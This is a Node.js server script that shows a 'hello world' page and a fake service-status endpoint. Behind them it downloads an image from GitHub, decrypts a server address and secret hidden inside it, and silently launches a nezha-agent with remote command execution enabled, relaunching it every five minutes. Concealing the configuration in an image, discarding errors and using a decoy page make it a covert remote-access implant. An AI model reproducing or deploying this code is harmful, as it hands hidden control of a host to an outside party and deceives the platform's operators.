const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { readdirSync, readFileSync } = require('fs');
const { spawn } = require('child_process');
const path = require('path');

// 容器统一临时目录，Docker已放开权限
const BASEDIR = '/tmp/logs';
const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

ensureDir(BASEDIR);

const processList = ["nezha-agent"];
const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data));
                } else {
                    reject(new Error(`Fetch failed`));
                }
            }).on('error', () => reject(new Error(`Network error`)));
        };
        request(url);
    });
}

function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    fs.unlink(destPath, () => {});
                    reject(new Error(`Download failed`));
                }
            }).on('error', () => {
                fs.unlink(destPath, () => {});
                reject(new Error(`Download error`));
            });
        };
        request(url);
    });
}

async function getServerIP() {
    try {
        return await fetchText('https://api.ipify.org');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0, 8)}-${hash.substring(8, 12)}-${hash.substring(12, 16)}-${hash.substring(16, 20)}-${hash.substring(20, 32)}`;
}

function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf-8').trim();

        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

async function startNezhaAgent() {
    try {
        console.log("Loading nezha agent config from image...");
        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
        const localImagePath = '/tmp/dknz.png';

        await fetchFile(imageUrl, localImagePath);
        const decryptedText = parseImageMetadata(localImagePath);
        if (!decryptedText) return;

        const nezhaConfig = parseEnv(decryptedText);
        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        const agentDir = '/tmp/agent_dir';
        const agentBin = '/usr/local/bin/nezha-agent';
        const configPath = path.join(agentDir, 'config.yml');

        if (!fs.existsSync(agentDir)) {
            fs.mkdirSync(agentDir, { recursive: true });
        }

        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        fs.writeFileSync(configPath, configContent);

        const child = spawn(agentBin, ['-c', configPath], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore"
        });

        child.on('spawn', () => {
            console.log("Nezha-agent started successfully");
        });
    } catch (err) {
        // 静默失败不抛错
    }
}

function listRunningCommands() {
    try {
        return readdirSync('/proc')
            .filter(name => /^\d+$/.test(name))
            .map(pid => {
                try {
                    return { pid, cmdline: readFileSync(`/proc/${pid}/cmdline`, 'utf-8') };
                } catch {
                    return null;
                }
            })
            .filter(Boolean);
    } catch {
        return [];
    }
}

async function monitorProcesses() {
    const running = listRunningCommands();
    const missing = processList.every(keyword =>
        !running.some(proc => proc.cmdline.includes(keyword))
    );
    if (missing) await startNezhaAgent();
}

const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// HTTP服务（纯HTTP，Cloudflare使用Flexible SSL解决526报错）
http.createServer(async (req, res) => {
    // 访问 /hello 显示哈喽世界页面，并自动启动哪吒
    if (req.url === '/hello') {
        res.writeHead(200, { 'Content-Type': 'text/html;charset=utf-8' });
        const html = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>哈喽世界</title>
<style>
body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#1890ff;color:#fff;font-size:48px;font-weight:bold}
</style>
</head>
<body>哈喽世界</body>
</html>
`;
        res.end(html);
        // 触发启动agent
        await startNezhaAgent();
        return;
    }

    // 首页JSON接口
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
        status: "online",
        service: "Agent Helper Service",
        version: "2.4.1",
        ports: PORT,
        routes: ["/", "/hello"]
    }));
}).listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    setTimeout(() => Scheduler.loop(), 2000);
});

function ensureDir(p) {
    if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
}
